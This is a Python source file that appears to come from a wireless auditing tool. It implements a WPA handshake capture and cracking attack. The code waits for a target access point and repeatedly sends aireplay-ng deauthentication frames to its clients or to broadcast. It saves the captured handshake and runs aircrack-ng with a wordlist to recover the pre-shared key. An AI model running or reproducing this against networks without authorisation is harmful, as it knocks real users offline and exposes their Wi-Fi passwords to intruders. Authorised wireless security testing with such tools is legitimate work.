#!/usr/bin/python

from Attack import Attack
from Airodump import Airodump
from Color import Color
from Configuration import Configuration
from Handshake import Handshake
from Process import Process
from CrackResultWPA import CrackResultWPA

import time
import os
import re
from shutil import copy

class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.crack_result = None
        self.success = False

    def run(self):
        '''
            Initiates full WPA hanshake capture attack.
        '''

        # Check if user only wants to run PixieDust attack
        if Configuration.pixie_only and self.target.wps:
            Color.pl('{!} {O}--pixie{R} set, ignoring WPA-handshake attack')
            self.success = False
            return self.success

        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wash=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_line()
            Color.p('\r{+} {C}WPA-handshake attack{W}: ')
            Color.p('{O}waiting{W} for target to appear...')
            airodump_target = self.wait_for_target(airodump)

            # Get client station MAC addresses
            clients = [c.station for c in airodump_target.clients]
            client_index = 0

            handshake = None

            time_since_deauth = time.time()

            deauth_proc = None

            while True:
                if not deauth_proc or deauth_proc.poll() != None:
                    # Clear line only if we're not deauthing right now
                    Color.p('\r%s\r' % (' ' * 90))
                Color.p('\r{+} {C}WPA-handshake attack{W}: ')
                Color.p('waiting for {C}handshake{W}...')

                time.sleep(1)

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                bssid = airodump_target.bssid
                essid = None
                if airodump_target.essid_known:
                    essid = airodump_target.essid
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    Color.pl('\n\n{+} {G}successfully captured handshake{W}')
                    break

                # There is no handshake
                handshake = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # Check status of deauth process
                if deauth_proc and deauth_proc.poll() == None:
                    # Deauth process is still running
                    time_since_deauth = time.time()

                # Look for new clients
                airodump_target = self.wait_for_target(airodump)
                for client in airodump_target.clients:
                    if client.station not in clients:
                        Color.pl('\r{+} discovered {G}client{W}:' +
                                 ' {C}%s{W}%s' % (client.station, ' ' * 10))
                        clients.append(client.station)

                # Send deauth to a client or broadcast
                if time.time()-time_since_deauth > Configuration.wpa_deauth_timeout:
                    # We are N seconds since last deauth was sent,
                    # And the deauth process is not running.
                    if len(clients) == 0 or client_index >= len(clients):
                        deauth_proc = self.deauth(bssid)
                        client_index = 0
                    else:
                        client = clients[client_index]
                        deauth_proc = self.deauth(bssid, client)
                        client_index += 1
                    time_since_deauth = time.time()
                continue

            # Stop the deauth process if needed
            if deauth_proc and deauth_proc.poll() == None:
                deauth_proc.interrupt()

            if not handshake:
                # No handshake, attack failed.
                self.success = False
                return self.success

            key = None

            # Save copy of handshake to ./hs/
            self.save_handshake(handshake)

            # Print analysis of handshake file
            Color.pl('\n{+} analysis of captured handshake file:')
            handshake.analyze()

            # Crack handshake
            wordlist = Configuration.wordlist
            if wordlist != None:
                wordlist_name = wordlist.split(os.sep)[-1]
                if not os.path.exists(wordlist):
                    Color.pl('{!} {R}unable to crack:' +
                             ' wordlist {O}%s{R} does not exist{W}' % wordlist)
                else:
                    # We have a wordlist we can use
                    Color.p('\n{+} {C}cracking handshake{W}' +
                            ' using {C}aircrack-ng{W}' +
                            ' with {C}%s{W} wordlist' % wordlist_name)

                    # TODO: More-verbose cracking status
                    # 1. Read number of lines in 'wordlist'
                    # 2. Pipe aircrack stdout to file
                    # 3. Read from file every second, get keys tried so far
                    # 4. Display # of keys tried / total keys, and ETA

                    key_file = Configuration.temp('wpakey.txt')
                    command = [
                        'aircrack-ng',
                        '-a', '2',
                        '-w', wordlist,
                        '-l', key_file,
                        handshake.capfile
                    ]
                    aircrack = Process(command, devnull=True)
                    aircrack.wait()
                    if os.path.exists(key_file):
                        # We cracked it.
                        Color.pl('\n\n{+} {G}successfully cracked PSK{W}\n')
                        f = open(key_file, 'r')
                        key = f.read()
                        f.close()
                    else:
                        Color.pl('\n{!} {R}handshake crack failed:' +
                                 ' {O}%s did not contain password{W}'
                                     % wordlist.split(os.sep)[-1])

            self.crack_result = CrackResultWPA(bssid, essid, handshake.capfile, key)
            self.crack_result.dump()
            self.success = True
            return self.success


    def save_handshake(self, handshake):
        '''
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        '''
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.mkdir(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
        copy(handshake.capfile, cap_filename)
        Color.pl('{G}saved{W}')

        # Update handshake to use the stored handshake file for future operations
        handshake.capfile = cap_filename


    def deauth(self, target_bssid, station_bssid=None):
        '''
            Sends deauthentication request.
            Args:
                target_bssid  - AP BSSID to deauth
                station_bssid - Client BSSID to deauth
                                Deauths 'broadcast' if no client is specified.
        '''
        # TODO: Print that we are deauthing and who we are deauthing!
        target_name = station_bssid
        if target_name == None:
            target_name = 'broadcast'
        command = [
            'aireplay-ng',
            '-0', # Deauthentication
            '1', # Number of deauths to perform.
            '-a', self.target.bssid
        ]
        command.append('--ignore-negative-one')
        if station_bssid:
            # Deauthing a specific client
            command.extend(['-c', station_bssid])
        command.append(Configuration.interface)
        Color.p(' {C}sending deauth{W} to {C}%s{W}' % target_name)
        return Process(command)

if __name__ == '__main__':
    from Target import Target
    fields = "A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, ".split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    wpa.run()

